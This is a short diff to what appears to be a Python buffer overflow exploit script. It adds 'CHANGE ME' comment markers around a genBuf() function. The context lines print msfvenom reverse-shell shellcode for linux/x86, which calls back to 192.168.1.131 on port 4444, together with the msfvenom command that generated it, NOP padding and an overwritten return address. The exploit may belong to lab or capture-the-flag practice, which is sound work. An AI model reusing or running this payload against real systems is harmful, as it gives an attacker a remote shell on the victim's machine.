@@ -48,6 +48,8 @@ def main():
 
 def genBuf():
 
+	#-------------------
+	# CHANGE ME
 	# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.131 LPORT=4444 -f python -b "\x00\x0a\x0d"
 	buf =  b""
 	buf += b"\xbf\x9e\x51\x1a\x09\xda\xda\xd9\x74\x24\xf4\x58"
@@ -58,7 +60,8 @@ def genBuf():
 	buf += b"\xab\x84\xbb\x67\x35\xc7\x6a\xd4\x09\xe4\x05\x3b"
 	buf += b"\xa0\x6b\x47\xd3\x55\x43\x1b\x4b\xc2\xb4\xf4\xe9"
 	buf += b"\x7b\x42\xe9\xbf\x28\xdd\x0f\x8f\xc4\x10\x4f"
-
+	#-------------------
+	
 	buf += b'\x90' * (168 - len(buf))
 
 	buf += b'\x63\x85\x04\x08'
